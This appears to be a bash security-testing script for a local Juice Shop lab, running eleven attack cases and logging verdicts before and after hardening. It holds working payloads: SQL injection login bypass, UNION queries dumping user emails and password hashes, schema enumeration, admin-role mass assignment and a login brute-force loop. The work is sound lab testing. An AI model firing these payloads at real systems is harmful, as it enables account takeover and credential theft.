#!/usr/bin/env bash
# Casos de ataque automatizados de la Fase 4 (caja gris: con conocimiento del código).
# ALCANCE: SOLO la instancia propia del laboratorio en 127.0.0.1. Rechaza cualquier otro objetivo.
# Mide el RIESGO INHERENTE. En la Fase 6 el mismo script se ejecuta contra el entorno endurecido
# (variable TARGET) para medir el riesgo residual.
# Uso: security/attacks/run.sh [http://127.0.0.1:3000]
set -uo pipefail
TARGET="${1:-http://127.0.0.1:3000}"
host="$(printf '%s' "$TARGET" | sed -E 's#https?://##; s#[:/].*##')"
case "$host" in
  127.0.0.1|localhost|::1|juice-hardened|juice-lab) : ;;
  *) echo "RECHAZADO: objetivo '$host' fuera del laboratorio. Solo 127.0.0.1/localhost."; exit 2 ;;
esac

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
TAG="${ATTACK_TAG:-antes}"            # 'antes' (vulnerable) o 'despues' (endurecido)
OUT="$ROOT/evidence/fase-4/$TAG"
mkdir -p "$OUT"
SUM="$OUT/resumen-ataques.md"
: > "$SUM"
C="curl -s -k --max-time 20"
pass=0; fail=0; n=0

# registra(id, titulo, cwe, veredicto, detalle)  veredicto: VULNERABLE | MITIGADO | N/D
reg() {
  n=$((n+1))
  [ "$4" = "VULNERABLE" ] && fail=$((fail+1)) || { [ "$4" = "MITIGADO" ] && pass=$((pass+1)); }
  printf '| %s | %s | %s | **%s** | %s |\n' "$1" "$2" "$3" "$4" "$5" >> "$SUM"
  printf '[%s] %-34s %s\n' "$4" "$1 $2" "$5"
}
save() { cat > "$OUT/$1"; }

echo "# Casos de ataque Fase 4 — objetivo $TARGET ($TAG)" >> "$SUM"
echo "" >> "$SUM"
echo "Ejecutado: $(date -Iseconds)" >> "$SUM"
echo "" >> "$SUM"
echo "| ID | Caso | CWE | Veredicto | Detalle |" >> "$SUM"
echo "|---|---|---|---|---|" >> "$SUM"

### A1 — SQLi: bypass de login como admin (CWE-89, routes/login.ts:34)
r=$($C -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}')
echo "$r" | save a1-sqli-login.json
if echo "$r" | grep -q '"token"'; then
  email=$(echo "$r" | grep -oE '"email":"[^"]*"' | head -1)
  reg A1 "SQLi bypass de login" CWE-89 VULNERABLE "Autenticado sin credenciales; $email"
else reg A1 "SQLi bypass de login" CWE-89 MITIGADO "Sin token (HTTP $(echo "$r" | head -c 40))"; fi

### A2 — SQLi UNION en búsqueda: extraer email+hash de usuarios (CWE-89, routes/search.ts:23)
q="qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9','10'%20FROM%20Users--"
r=$($C "$TARGET/rest/products/search?q=$q")
echo "$r" | save a2-sqli-union-search.json
if echo "$r" | grep -qiE '([a-f0-9]{32})'; then
  reg A2 "SQLi UNION (volcado de Users)" CWE-89 VULNERABLE "Se obtienen email y hash MD5 de usuarios"
else reg A2 "SQLi UNION (volcado de Users)" CWE-89 MITIGADO "Sin datos de Users en la respuesta"; fi

### A3 — Enumeración del esquema vía SQLi (sqlite_master) (CWE-89)
q="qwert'))%20UNION%20SELECT%20sql,'2','3','4','5','6','7','8','9','10'%20FROM%20sqlite_master--"
r=$($C "$TARGET/rest/products/search?q=$q")
echo "$r" | save a3-sqli-schema.json
if echo "$r" | grep -qi "CREATE TABLE"; then
  reg A3 "SQLi enumeración de esquema" CWE-89 VULNERABLE "sqlite_master revela DDL de las tablas"
else reg A3 "SQLi enumeración de esquema" CWE-89 MITIGADO "Sin DDL en la respuesta"; fi

### A4 — Listado de directorios sensibles (CWE-548, server.ts:290/298/302)
vd=""
for p in ftp encryptionkeys support/logs; do
  code=$($C -o /dev/null -w '%{http_code}' "$TARGET/$p/")
  body=$($C "$TARGET/$p/")
  echo "GET /$p/ -> $code"; echo "$body" | head -c 4000
  echo "---"
  if [ "$code" = "200" ] && echo "$body" | grep -qiE 'href=|<a '; then vd="$vd /$p"; fi
done > "$OUT/a4-directory-listing.txt" 2>&1
if [ -n "$vd" ]; then reg A4 "Listado de directorios" CWE-548 VULNERABLE "Navegables:$vd"
else reg A4 "Listado de directorios" CWE-548 MITIGADO "Sin listados navegables"; fi

### A5 — Descarga de archivo confidencial del FTP vía poison null byte / traversal (CWE-22)
r=$($C -o "$OUT/a5-acquisitions.md" -w '%{http_code}' "$TARGET/ftp/acquisitions.md")
if [ "$r" = "200" ] && [ -s "$OUT/a5-acquisitions.md" ]; then
  reg A5 "Acceso a documento interno (/ftp)" CWE-22 VULNERABLE "acquisitions.md descargado (HTTP 200)"
else reg A5 "Acceso a documento interno (/ftp)" CWE-22 MITIGADO "HTTP $r"; fi

### A6 — /metrics expuesto sin autenticación (CWE-200, server.ts:759)
code=$($C -o "$OUT/a6-metrics.txt" -w '%{http_code}' "$TARGET/metrics")
if [ "$code" = "200" ] && grep -qiE '^# (HELP|TYPE)' "$OUT/a6-metrics.txt"; then
  reg A6 "/metrics sin autenticación" CWE-200 VULNERABLE "Métricas Prometheus accesibles (HTTP 200)"
else reg A6 "/metrics sin autenticación" CWE-200 MITIGADO "HTTP $code"; fi

### A7 — Asignación masiva: registrar usuario con role=admin (CWE-915, server.ts:436)
em="attacker_$(date +%s)@juice-sh.op"
r=$($C -X POST "$TARGET/api/Users" -H 'Content-Type: application/json' \
  --data '{"email":"'"$em"'","password":"Passw0rd!","role":"admin"}')
echo "$r" | save a7-mass-assignment.json
if echo "$r" | grep -q '"role":"admin"'; then
  reg A7 "Asignación masiva (role=admin)" CWE-915 VULNERABLE "Usuario creado con role=admin"
else reg A7 "Asignación masiva (role=admin)" CWE-915 MITIGADO "role no aceptado ($(echo "$r" | grep -oE '"role":"[^"]*"' | head -1))"; fi

### A8 — CORS permisivo (CWE-942, server.ts:184)
hdr=$($C -D - -o /dev/null -H 'Origin: https://evil.example' "$TARGET/rest/admin/application-version")
echo "$hdr" | save a8-cors-headers.txt
if echo "$hdr" | grep -qiE 'access-control-allow-origin: (\*|https://evil.example)'; then
  reg A8 "CORS permisivo" CWE-942 VULNERABLE "ACAO refleja/permite origen arbitrario"
else reg A8 "CORS permisivo" CWE-942 MITIGADO "Sin ACAO abierto"; fi

### A9 — Cabeceras de seguridad ausentes (CWE-693)
hdr=$($C -D - -o /dev/null "$TARGET/")
echo "$hdr" | save a9-security-headers.txt
miss=""
for h in "content-security-policy" "strict-transport-security" "x-content-type-options" "x-frame-options"; do
  echo "$hdr" | grep -qi "^$h:" || miss="$miss $h"
done
if [ -n "$miss" ]; then reg A9 "Cabeceras de seguridad" CWE-693 VULNERABLE "Ausentes:$miss"
else reg A9 "Cabeceras de seguridad" CWE-693 MITIGADO "Presentes las 4 cabeceras clave"; fi

### A10 — Fuerza bruta: sin rate limit en /rest/user/login (CWE-307, server.ts:624)
codes=""
for i in $(seq 1 12); do
  c=$($C -o /dev/null -w '%{http_code}' -X POST "$TARGET/rest/user/login" \
    -H 'Content-Type: application/json' --data '{"email":"admin@juice-sh.op","password":"wrong'"$i"'"}')
  codes="$codes $c"
done
echo "12 intentos ->$codes" | save a10-bruteforce-login.txt
if echo "$codes" | grep -q 429; then reg A10 "Fuerza bruta en login" CWE-307 MITIGADO "Aparece HTTP 429:$codes"
else reg A10 "Fuerza bruta en login" CWE-307 VULNERABLE "12 intentos sin 429:$codes"; fi

### A11 — Clave privada JWT expuesta en /encryptionkeys (CWE-798, server.ts:298)
code=$($C -o "$OUT/a11-jwt-key.txt" -w '%{http_code}' "$TARGET/encryptionkeys/jwt.pub")
if [ "$code" = "200" ] && grep -qi "PUBLIC KEY" "$OUT/a11-jwt-key.txt"; then
  reg A11 "Material criptográfico expuesto" CWE-798 VULNERABLE "jwt.pub servido en /encryptionkeys (HTTP 200)"
else reg A11 "Material criptográfico expuesto" CWE-798 MITIGADO "HTTP $code"; fi

echo "" >> "$SUM"
echo "**Resultado:** $fail VULNERABLE / $pass MITIGADO de $n casos." >> "$SUM"
echo ""
echo "=== $fail VULNERABLE / $pass MITIGADO de $n casos ($TAG) ==="
bash "$ROOT/scripts/bitacora.sh" 4 "security/attacks/run.sh ($TARGET, $TAG)" "curl + código del laboratorio" "$fail VULNERABLE / $pass MITIGADO de $n. $SUM"
